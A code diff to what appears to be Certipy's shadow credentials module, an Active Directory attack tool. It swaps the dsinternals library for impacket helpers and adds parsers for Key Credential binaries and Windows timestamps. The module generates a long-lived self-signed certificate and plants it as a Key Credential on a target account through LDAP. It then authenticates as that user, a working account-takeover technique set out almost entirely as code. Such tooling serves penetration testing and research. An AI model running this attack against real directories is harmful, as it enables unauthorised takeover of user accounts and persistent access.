@@ -16,21 +16,20 @@ References:
 """
 
 import argparse
+import datetime
+import struct
 from typing import List, Optional, Tuple, Union
 
 import ldap3
 import OpenSSL
 from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.common.data.DNWithBinary import DNWithBinary
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
-from dsinternals.system.DateTime import DateTime
-from dsinternals.system.Guid import Guid
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
 
 from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, x509
+from certipy.lib.errors import handle_error
 from certipy.lib.files import try_to_save_file
 from certipy.lib.ldap import LDAPConnection, LDAPEntry
-from certipy.lib.logger import is_verbose, logging
+from certipy.lib.logger import logging
 from certipy.lib.target import Target
 
 from .auth import Authenticate
@@ -167,17 +166,18 @@ class Shadow:
         return False
 
     def generate_key_credential(
-        self, target_dn: str, subject: str
-    ) -> Tuple[X509Certificate2, KeyCredential, str]:
+        self, subject: str
+    ) -> Tuple[
+        OpenSSL.crypto.PKey, OpenSSL.crypto.X509, shadow_credentials.KeyCredential, str
+    ]:
         """
         Generate a new certificate and Key Credential object.
 
         Args:
-            target_dn: Distinguished name of the target user
             subject: Certificate subject name
 
         Returns:
-            Tuple containing (certificate, key_credential, device_id)
+            Tuple containing (key, cert, key_credential, device_id)
         """
         logging.info("Generating certificate")
 
@@ -187,31 +187,38 @@ class Shadow:
             subject = subject[:64]
 
         # Generate a certificate valid for a long time (-40 to +40 years)
-        cert = X509Certificate2(
+        key, cert = shadow_credentials.createSelfSignedX509Certificate(
             subject=subject,
-            keySize=2048,
-            notBefore=(-40 * 365),
-            notAfter=(40 * 365),
+            nBefore=(-40 * 365),  # Not before: 40 years ago
+            nAfter=(40 * 365),  # Not after: 40 years in the future
+            kSize=2048,  # Key size
         )
         logging.info("Certificate generated")
 
         # Create a Key Credential from the certificate
         logging.info("Generating Key Credential")
-        key_credential = KeyCredential.fromX509Certificate2(
+        device_id = shadow_credentials.getDeviceId()  # Generate a random device ID
+        key_credential = shadow_credentials.KeyCredential(
             certificate=cert,
-            deviceId=Guid(),  # Generate a random device ID
-            owner=target_dn,
-            currentTime=DateTime(),
+            key=key,
+            deviceId=device_id,
+            currentTime=now_ticks(),
         )
 
-        device_id = key_credential.DeviceId.toFormatD()
+        device_id = device_id.hex()
         logging.info(f"Key Credential generated with DeviceID {device_id!r}")
 
-        return (cert, key_credential, device_id)
+        return (key, cert, key_credential, device_id)
 
-    def add_new_key_credential(
-        self, target_dn: str, user: LDAPEntry
-    ) -> Optional[Tuple[X509Certificate2, List[Union[bytes, str]], List[bytes], str]]:
+    def add_new_key_credential(self, target_dn: str, user: LDAPEntry) -> Optional[
+        Tuple[
+            OpenSSL.crypto.PKey,
+            OpenSSL.crypto.X509,
+            List[Union[bytes, str]],
+            List[bytes],
+            str,
+        ]
+    ]:
         """
         Add a new Key Credential to a user.
 
@@ -220,18 +227,14 @@ class Shadow:
             user: LDAP user entry
 
         Returns:
-            Tuple containing (certificate, new_key_credential_list,
-                             saved_key_credential_list, device_id) or None on failure
+            Tuple containing (key, cert, new_key_credential, saved_key_credential, device_id)
+            or None on failure
         """
         # Generate a new Key Credential
         sam_account_name = self._get_sam_account_name(user)
-        cert, key_credential, device_id = self.generate_key_credential(
-            target_dn, sam_account_name
+        key, cert, key_credential, device_id = self.generate_key_credential(
+            sam_account_name
         )
-
-        # Show detailed info in verbose mode
-        if is_verbose():
-            key_credential.fromDNWithBinary(key_credential.toDNWithBinary()).show()
 
         # Get the existing Key Credentials
         saved_key_credential = self.get_key_credentials(target_dn, user)
@@ -240,7 +243,10 @@ class Shadow:
 
         # Create a new list including our new Key Credential
         new_key_credential = saved_key_credential + [
-            key_credential.toDNWithBinary().toString()
+            shadow_credentials.toDNWithBinary2String(
+                key_credential.dumpBinary(),
+                target_dn,
+            )
         ]
 
         logging.info(
@@ -258,33 +264,32 @@ class Shadow:
             f"{user.get('sAMAccountName')!r}"
         )
 
-        return (cert, new_key_credential, saved_key_credential, device_id)
+        return (key, cert, new_key_credential, saved_key_credential, device_id)
 
     def get_key_and_certificate(
-        self, cert2: X509Certificate2
+        self, key: OpenSSL.crypto.PKey, cert: OpenSSL.crypto.X509
     ) -> Tuple[PrivateKeyTypes, x509.Certificate]:
         """
         Extract the private key and certificate from an X509Certificate2 object.
 
         Args:
-            cert2: X509Certificate2 object
+            key: OpenSSL crypto PKey object (private key)
+            cert: OpenSSL crypto X509 object (certificate)
 
         Returns:
             Tuple containing (private_key, certificate)
         """
         # Extract and convert the private key
-        key = der_to_key(
-            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert2.key)  # type: ignore
+        _key = der_to_key(
+            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, key)
         )
 
         # Extract and convert the certificate
-        cert = der_to_cert(
-            OpenSSL.crypto.dump_certificate(
-                OpenSSL.crypto.FILETYPE_ASN1, cert2.certificate
-            )
+        _cert = der_to_cert(
+            OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
         )
 
-        return (key, cert)
+        return (_key, _cert)
 
     def _get_target_dn(self, user: LDAPEntry) -> Optional[str]:
         """
@@ -357,10 +362,10 @@ class Shadow:
             return None
 
         # Unpack the result
-        cert, _, saved_key_credential, _ = result
+        key, cert, _, saved_key_credential, _ = result
 
         # Extract the key and certificate for authentication
-        key, cert = self.get_key_and_certificate(cert)
+        key, cert = self.get_key_and_certificate(key, cert)
 
         # Authenticate with the new Key Credential
         sam_account_name = self._get_sam_account_name(user)
@@ -413,10 +418,10 @@ class Shadow:
             return False
 
         # Unpack the result
-        cert, _, _, _ = result
+        key, cert, _, _, _ = result
 
         # Extract the key and certificate
-        key, cert = self.get_key_and_certificate(cert)
+        key, cert = self.get_key_and_certificate(key, cert)
 
         # Determine output filename
         out = self.out
@@ -473,13 +478,23 @@ class Shadow:
         # List the Key Credentials
         logging.info(f"Listing Key Credentials for {sam_account_name!r}")
         for dn_binary_value in key_credentials:
-            key_credential = KeyCredential.fromDNWithBinary(
-                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
+            key_credential_device_id, key_credential_creation_time = (
+                get_device_id_and_creation_from_binary(dn_binary_value)
+            )
+            creation_time = (
+                ticks_to_datetime(key_credential_creation_time)
+                if key_credential_creation_time
+                else None
+            )
+            creation_time_str = (
+                creation_time.strftime("%Y-%m-%d %H:%M:%S")
+                if creation_time
+                else "Unknown"
             )
 
             logging.info(
-                f"DeviceID: {key_credential.DeviceId.toFormatD()} | "
-                f"Creation Time (UTC): {key_credential.CreationTime}"
+                f"DeviceID: {key_credential_device_id or "Unknown"} | "
+                f"Creation Time (UTC): {creation_time_str}"
             )
 
         return True
@@ -563,10 +578,10 @@ class Shadow:
         device_id_in_current_values = False
 
         for dn_binary_value in key_credentials:
-            key_credential = KeyCredential.fromDNWithBinary(
-                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
+            key_credential_device_id, _ = get_device_id_and_creation_from_binary(
+                dn_binary_value
             )
-            if key_credential.DeviceId.toFormatD() == device_id:
+            if key_credential_device_id == device_id:
                 logging.info(
                     f"Found device ID {device_id!r} in Key Credentials {sam_account_name!r}"
                 )
@@ -638,14 +653,34 @@ class Shadow:
         # Find the specified Key Credential and display its info
         device_id = self.device_id
         for dn_binary_value in key_credentials:
-            key_credential = KeyCredential.fromDNWithBinary(
-                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
+            key_credential_device_id, key_credential_creation_time = (
+                get_device_id_and_creation_from_binary(dn_binary_value)
             )
-            if key_credential.DeviceId.toFormatD() == device_id:
+            if key_credential_device_id is None:
+                logging.error(
+                    f"Failed to extract Device ID from Key Credential binary for {sam_account_name!r}"
+                )
+                return False
+            if key_credential_creation_time is None:
+                logging.error(
+                    f"Failed to extract Creation Time from Key Credential binary for {sam_account_name!r}"
+                )
+                return False
+            if key_credential_device_id == device_id:
                 logging.info(
                     f"Found device ID {device_id!r} in Key Credentials {sam_account_name!r}"
                 )
-                key_credential.show()
+                creation_time = ticks_to_datetime(key_credential_creation_time)
+                creation_time_str = (
+                    creation_time.strftime("%Y-%m-%d %H:%M:%S")
+                    if creation_time
+                    else "Unknown"
+                )
+                logging.info(
+                    f"DeviceID: {key_credential_device_id} | "
+                    f"Creation Time (UTC): {creation_time_str}"
+                )
+
                 return True
 
         logging.error(
@@ -654,6 +689,156 @@ class Shadow:
         )
 
         return False
+
+
+def unpack_data(data: bytes) -> List[Tuple[int, bytes]]:
+    """
+    Unpack binary data into a list of (field_type, field_value) tuples.
+
+    This function parses the Key Credential binary format by reading fields
+    consisting of a 2-byte length, 1-byte type, and variable-length value.
+
+    Args:
+        data: Binary data to unpack (Key Credential binary)
+
+    Returns:
+        List of tuples containing field type and value
+    """
+    fields = []
+    # Skip the first 4 bytes which contain the version information
+    offset = 4
+
+    while offset < len(data):
+        # Each field has a 2-byte length and 1-byte type header
+        length, field_type = struct.unpack("<HB", data[offset : offset + 3])
+        offset += 3
+
+        # Extract the field value based on the specified length
+        field_value = data[offset : offset + length]
+        offset += length
+
+        fields.append((field_type, field_value))
+
+    return fields
+
+
+def binary_data_from_dn_with_binary(dn_with_binary: Union[str, bytes]) -> bytes:
+    """
+    Convert a DNWithBinary string to its binary representation.
+
+    DNWithBinary format: "B:<length>:<hex_data>:<dn>"
+    Example: "B:826:4e544c4d5353500001....:CN=User,DC=domain,DC=com"
+
+    Args:
+        dn_with_binary: DNWithBinary string or bytes
+
+    Returns:
+        Binary representation of the DNWithBinary
+
+    Raises:
+        ValueError: If the DNWithBinary format is invalid
+    """
+    if isinstance(dn_with_binary, bytes):
+        # Convert bytes to string if needed
+        dn_with_binary = dn_with_binary.decode()
+
+    # DNWithBinary format is "B:<length>:<hex_data>:<dn>"
+    parts = dn_with_binary.split(":")
+    if len(parts) != 4:
+        raise ValueError(
+            f"Invalid DNWithBinary format: expected 4 parts but got {len(parts)}"
+        )
+
+    # Extract and validate the binary data
+    length = int(parts[1])
+    hex_data = parts[2]
+
+    if len(hex_data) != length:
+        raise ValueError(
+            f"Hex data length mismatch: stated {length} but actual {len(hex_data)}"
+        )
+
+    # Convert hex string to binary data
+    return bytes.fromhex(hex_data)
+
+
+def get_device_id_and_creation_from_binary(
+    key_credential: bytes,
+) -> Tuple[Optional[str], Optional[int]]:
+    """
+    Extract Device ID and Creation Time from a Key Credential binary.
+
+    Args:
+        key_credential: Key Credential binary data or DNWithBinary string/bytes
+
+    Returns:
+        Tuple containing (device_id, creation_time) where:
+          - device_id is a hex string
+          - creation_time is Windows ticks (100ns intervals since Jan 1, 1601)
+        Returns (None, None) if extraction fails
+    """
+    try:
+        # Convert from DNWithBinary format if needed
+        key_credential_binary = binary_data_from_dn_with_binary(key_credential)
+
+        # Parse the binary data into fields
+        fields = unpack_data(key_credential_binary)
+
+        # Extract device ID and creation time from fields
+        device_id = None
+        creation_time = None
+
+        for field_type, field_value in fields:
+            if field_type == 0x6:  # Device ID field
+                device_id = field_value.hex()
+            elif field_type == 0x9:  # Creation time field (8-byte Windows timestamp)
+                creation_time = struct.unpack("<Q", field_value)[0]
+
+        if device_id is None or creation_time is None:
+            logging.error("Missing required fields in Key Credential binary")
+            return None, None
+
+        return (device_id, creation_time)
+
+    except Exception as e:
+        handle_error()
+        logging.error(f"Failed to process Key Credential binary: {e}")
+        return None, None
+
+
+def now_ticks() -> int:
+    """
+    Get the current time in Windows ticks (100ns intervals since Jan 1, 1601 UTC).
+
+    Used for creating timestamps in Key Credential objects.
+
+    Returns:
+        Current time as Windows ticks
+    """
+    # Windows ticks: 100ns intervals since January 1, 1601 UTC
+    windows_epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
+    now = datetime.datetime.now(datetime.timezone.utc)
+
+    # Convert seconds to 100ns intervals (multiply by 10M)
+    return int((now - windows_epoch).total_seconds() * 1e7)
+
+
+def ticks_to_datetime(ticks: int) -> datetime.datetime:
+    """
+    Convert Windows ticks to a UTC datetime object.
+
+    Args:
+        ticks: Number of 100ns intervals since January 1, 1601 UTC
+
+    Returns:
+        UTC datetime object
+    """
+    windows_epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
+
+    # Convert ticks (100ns intervals) to microseconds by dividing by 10
+    delta_microseconds = ticks / 10
+
+    return windows_epoch + datetime.timedelta(microseconds=delta_microseconds)
 
 
 def entry(options: argparse.Namespace) -> None:
